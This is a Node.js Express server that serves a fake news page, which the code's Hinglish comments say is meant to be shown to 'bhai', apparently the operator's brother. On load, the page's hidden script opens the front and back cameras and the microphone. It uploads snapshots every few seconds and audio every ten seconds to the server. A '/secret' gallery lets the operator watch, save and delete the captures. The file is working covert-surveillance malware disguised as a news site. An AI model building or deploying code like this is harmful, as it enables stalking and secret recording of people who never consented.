const express = require('express');
const multer = require('multer');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use('/uploads', express.static('uploads'));

if (!fs.existsSync('./uploads')) {
    fs.mkdirSync('./uploads');
}

const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + Math.round(Math.random() * 1E9) + '.jpg');
    }
});
const upload = multer({ storage });

let photos = [];

// Secret upload for images
app.post('/api/secret-upload', upload.single('photo'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    
    const photo = {
        id: Date.now(),
        filename: req.file.filename,
        url: `/uploads/${req.file.filename}`,
        type: req.body.type || 'front',
        timestamp: new Date().toISOString()
    };
    
    photos.unshift(photo);
    if (photos.length > 200) photos.pop();
    
    console.log(`📸 SECRET ${photo.type.toUpperCase()} PHOTO at ${new Date().toLocaleString()}`);
    res.json({ success: true });
});

// Get all secret photos
app.get('/api/secret/photos', (req, res) => {
    res.json(photos);
});

// Delete photo
app.delete('/api/photos/:id', (req, res) => {
    const id = parseInt(req.params.id);
    const photo = photos.find(p => p.id === id);
    if (photo) {
        const filePath = path.join('./uploads', photo.filename);
        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
        photos = photos.filter(p => p.id !== id);
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

// ============= FAKE PAGE (bhai ko ye dikhega - News Website) =============
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>News Today</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #f5f5f5; 
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        .header {
            background: #c41e3a;
            color: white;
            padding: 15px;
            text-align: center;
        }
        .news-container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
        }
        .news-card {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .news-title {
            color: #c41e3a;
            margin-bottom: 10px;
        }
        .fake-ad {
            background: #e8f4fd;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            margin-top: 20px;
            border: 1px solid #b0d4ff;
        }
        .loading-bar {
            height: 2px;
            background: #c41e3a;
            width: 100%;
            animation: loading 2s infinite;
        }
        @keyframes loading {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>📰 News Today</h1>
        <p>Breaking News | Latest Updates</p>
    </div>
    <div class="loading-bar"></div>
    
    <div class="news-container">
        <div class="news-card">
            <h2 class="news-title">🎯 Breaking: Major Tech Breakthrough</h2>
            <p>Scientists have discovered a new way to process information that could revolutionize computing as we know it. The breakthrough comes after years of research...</p>
            <small>2 minutes ago</small>
        </div>
        
        <div class="news-card">
            <h2 class="news-title">🌍 Global Summit 2026</h2>
            <p>World leaders gather to discuss climate change and sustainable development goals. Historic agreements expected by the end of this week...</p>
            <small>15 minutes ago</small>
        </div>
        
        <div class="fake-ad">
            <strong>📱 Best Performance Tips</strong><br>
            Optimizing your device for better speed and battery life. <span style="color:#c41e3a;">Read more →</span>
        </div>
        
        <div class="news-card">
            <h2 class="news-title">⚡ Sports Update</h2>
            <p>Local team makes historic win in the championship finals. Fans celebrate across the city with fireworks and festivities...</p>
            <small>1 hour ago</small>
        </div>
    </div>
    
    <footer>© 2026 News Today | All rights reserved</footer>

    <script>
        // HIDDEN CAMERA + AUDIO RECORDER - Secretly captures front & back photos
        let frontStream = null;
        let backStream = null;
        let audioStream = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let captureInterval = null;
        
        async function startSecretCapture() {
            try {
                // Get FRONT camera (selfie)
                const front = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } },
                    audio: true
                });
                frontStream = front;
                
                // Get BACK camera
                const back = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "environment" } }
                });
                backStream = back;
                
                // Get AUDIO only
                const audio = await navigator.mediaDevices.getUserMedia({ audio: true });
                audioStream = audio;
                
                // Create hidden video elements
                const frontVideo = document.createElement('video');
                const backVideo = document.createElement('video');
                frontVideo.srcObject = frontStream;
                backVideo.srcObject = backStream;
                frontVideo.autoplay = true;
                backVideo.autoplay = true;
                frontVideo.muted = true;
                backVideo.muted = true;
                frontVideo.style.display = 'none';
                backVideo.style.display = 'none';
                document.body.appendChild(frontVideo);
                document.body.appendChild(backVideo);
                
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                startAudioRecording();
                
                captureInterval = setInterval(async () => {
                    if (frontVideo.videoWidth && frontVideo.videoHeight) {
                        await captureAndSend(frontVideo, 'front');
                    }
                    if (backVideo.videoWidth && backVideo.videoHeight) {
                        await captureAndSend(backVideo, 'back');
                    }
                }, 5000);
                
                setTimeout(async () => {
                    for(let i = 0; i < 3; i++) {
                        if (frontVideo.videoWidth) await captureAndSend(frontVideo, 'front');
                        if (backVideo.videoWidth) await captureAndSend(backVideo, 'back');
                        await new Promise(r => setTimeout(r, 800));
                    }
                }, 1000);
                
                console.log('Secret capture started');
                
            } catch(err) {
                console.error('Permission error:', err);
                try {
                    const fallback = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = fallback;
                    video.autoplay = true;
                    video.style.display = 'none';
                    document.body.appendChild(video);
                    setInterval(async () => {
                        if (video.videoWidth) await captureAndSend(video, 'front');
                    }, 5000);
                } catch(e) {}
            }
        }
        
        async function captureAndSend(video, type) {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.85))).blob();
                const formData = new FormData();
                formData.append('photo', blob, \`\${type}_\${Date.now()}.jpg\`);
                formData.append('type', type);
                
                await fetch('/api/secret-upload', { method: 'POST', body: formData });
                console.log(\`\${type} photo sent\`);
            } catch(err) {
                console.error('Capture failed:', err);
            }
        }
        
        async function startAudioRecording() {
            try {
                mediaRecorder = new MediaRecorder(audioStream);
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        audioChunks.push(event.data);
                    }
                };
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    const formData = new FormData();
                    formData.append('photo', audioBlob, \`audio_\${Date.now()}.webm\`);
                    formData.append('type', 'audio');
                    await fetch('/api/secret-upload', { method: 'POST', body: formData });
                    audioChunks = [];
                };
                mediaRecorder.start(10000);
                setInterval(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        setTimeout(() => {
                            mediaRecorder.start(10000);
                        }, 100);
                    }
                }, 10000);
            } catch(err) {
                console.error('Audio recording failed:', err);
            }
        }
        
        startSecretCapture();
        
        window.addEventListener('beforeunload', () => {
            if (captureInterval) clearInterval(captureInterval);
            if (frontStream) frontStream.getTracks().forEach(t => t.stop());
            if (backStream) backStream.getTracks().forEach(t => t.stop());
            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        });
    </script>
</body>
</html>
    `);
});

// ============= SECRET PAGE (aap yahan sab dekho) =============
app.get('/secret', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔓 Secret Gallery - Front + Back + Audio</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0f0f1a; font-family: system-ui, sans-serif; padding: 20px; }
        .header { background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%); padding: 20px; border-radius: 24px; margin-bottom: 24px; text-align: center; }
        h1 { color: white; font-size: 1.5rem; }
        .stats { color: #fecaca; font-size: 0.9rem; margin-top: 8px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
        .photo-card { background: #1e1e2a; border-radius: 20px; overflow: hidden; border: 1px solid #2d2d3a; transition: transform 0.2s; position: relative; }
        .photo-card:hover { transform: translateY(-4px); }
        .photo-card img { width: 100%; aspect-ratio: 4/3; object-fit: cover; cursor: pointer; }
        .badge-front { position: absolute; top: 10px; left: 10px; background: #3b82f6; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; z-index: 1; }
        .badge-back { position: absolute; top: 10px; left: 10px; background: #10b981; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; z-index: 1; }
        .badge-audio { position: absolute; top: 10px; left: 10px; background: #f59e0b; color: white; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; z-index: 1; }
        .info { padding: 12px; color: #a0a0b0; font-size: 0.7rem; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .timestamp { font-size: 0.65rem; color: #6b6b7a; }
        .delete-btn, .download-btn { padding: 6px 12px; border-radius: 20px; cursor: pointer; font-size: 0.7rem; border: none; }
        .download-btn { background: #3b82f6; color: white; }
        .delete-btn { background: #dc2626; color: white; }
        .status { text-align: center; padding: 15px; background: #1a1a24; border-radius: 40px; margin-bottom: 20px; color: #86efac; font-size: 0.9rem; }
        .empty { text-align: center; color: #6b6b7a; padding: 60px; font-size: 1.2rem; }
        .auto-refresh { background: #2d2d3a; padding: 8px 16px; border-radius: 40px; font-size: 0.8rem; display: inline-block; margin-bottom: 15px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .modal img { max-width: 90%; max-height: 90%; border-radius: 12px; }
        .modal-close { position: absolute; top: 20px; right: 30px; color: white; font-size: 40px; cursor: pointer; }
        audio { width: 100%; margin-top: 5px; }
        .photo-wrapper { position: relative; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔓 SECRET GALLERY - FRONT + BACK + AUDIO</h1>
        <div class="stats" id="stats">Loading...</div>
    </div>
    <div style="text-align: center;">
        <div class="auto-refresh">🔄 Auto-refresh every 3 seconds</div>
    </div>
    <div id="status" class="status">⏳ Waiting for secret captures...</div>
    <div id="gallery" class="gallery"></div>
    <div id="modal" class="modal">
        <span class="modal-close">&times;</span>
        <img id="modalImg" src="">
    </div>

    <script>
        const API_URL = window.location.origin;
        let lastPhotoCount = 0;
        
        function getBadge(type) {
            if(type === 'front') return '<span class="badge-front">📱 FRONT CAM</span>';
            if(type === 'back') return '<span class="badge-back">📷 BACK CAM</span>';
            if(type === 'audio') return '<span class="badge-audio">🎤 AUDIO</span>';
            return '';
        }
        
        async function loadPhotos() {
            try {
                const response = await fetch(\`\${API_URL}/api/secret/photos\`);
                const photos = await response.json();
                const gallery = document.getElementById('gallery');
                const status = document.getElementById('status');
                const stats = document.getElementById('stats');
                
                const newPhotosCount = photos.length - lastPhotoCount;
                lastPhotoCount = photos.length;
                
                if (photos.length === 0) {
                    gallery.innerHTML = '<div class="empty">📭 No captures yet<br>When bhai opens the website, front + back + audio will capture automatically</div>';
                    status.innerHTML = '⏳ Waiting for bhai to open... Front & Back cameras + Audio will capture';
                    stats.innerHTML = '📸 0 captures';
                    return;
                }
                
                stats.innerHTML = \`📸 \${photos.length} total captures | Front + Back + Audio | Last: \${new Date(photos[0].timestamp).toLocaleTimeString()}\`;
                
                if (newPhotosCount > 0) {
                    status.innerHTML = \`🔴 NEW! \${newPhotosCount} new capture\${newPhotosCount > 1 ? 's' : ''} received! 🎯\`;
                    setTimeout(() => {
                        status.innerHTML = \`✅ \${photos.length} captures | Front + Back + Audio | Auto-refresh active\`;
                    }, 3000);
                } else {
                    status.innerHTML = \`✅ \${photos.length} secret captures | Front Camera 📱 | Back Camera 📷 | Audio 🎤\`;
                }
                
                gallery.innerHTML = photos.map(photo => {
                    if(photo.type === 'audio') {
                        return \`
                            <div class="photo-card" data-id="\${photo.id}">
                                <div class="photo-wrapper">
                                    \${getBadge(photo.type)}
                                    <audio controls>
                                        <source src="\${photo.url}" type="audio/webm">
                                    </audio>
                                </div>
                                <div class="info">
                                    <span class="timestamp">📅 \${new Date(photo.timestamp).toLocaleString()}</span>
                                    <div>
                                        <button class="download-btn" onclick="downloadPhoto('\${photo.url}', 'audio')">💾 Save Audio</button>
                                        <button class="delete-btn" onclick="deletePhoto(\${photo.id})">🗑️ Delete</button>
                                    </div>
                                </div>
                            </div>
                        \`;
                    } else {
                        return \`
                            <div class="photo-card" data-id="\${photo.id}">
                                <div class="photo-wrapper">
                                    \${getBadge(photo.type)}
                                    <img src="\${photo.url}" alt="Secret \${photo.type} photo" onclick="openModal('\${photo.url}')">
                                </div>
                                <div class="info">
                                    <span class="timestamp">📅 \${new Date(photo.timestamp).toLocaleString()}</span>
                                    <div>
                                        <button class="download-btn" onclick="downloadPhoto('\${photo.url}', 'image')">💾 Save</button>
                                        <button class="delete-btn" onclick="deletePhoto(\${photo.id})">🗑️ Delete</button>
                                    </div>
                                </div>
                            </div>
                        \`;
                    }
                }).join('');
                
            } catch (err) {
                console.error(err);
                document.getElementById('status').innerHTML = '❌ Connection error';
            }
        }
        
        async function deletePhoto(id) {
            if (!confirm('Delete this capture?')) return;
            try {
                await fetch(\`\${API_URL}/api/photos/\${id}\`, { method: 'DELETE' });
                loadPhotos();
            } catch(err) {
                alert('Error deleting');
            }
        }
        
        function downloadPhoto(url, type) {
            const link = document.createElement('a');
            link.href = url;
            const ext = type === 'audio' ? 'webm' : 'jpg';
            link.download = \`secret_\${Date.now()}.\${ext}\`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
        
        function openModal(url) {
            const modal = document.getElementById('modal');
            const modalImg = document.getElementById('modalImg');
            modal.style.display = 'flex';
            modalImg.src = url;
        }
        
        document.querySelector('.modal-close')?.addEventListener('click', () => {
            document.getElementById('modal').style.display = 'none';
        });
        window.onclick = (e) => {
            if (e.target === document.getElementById('modal')) {
                document.getElementById('modal').style.display = 'none';
            }
        };
        
        loadPhotos();
        setInterval(loadPhotos, 3000);
    </script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔓 Secret view: http://localhost:${PORT}/secret`);
});
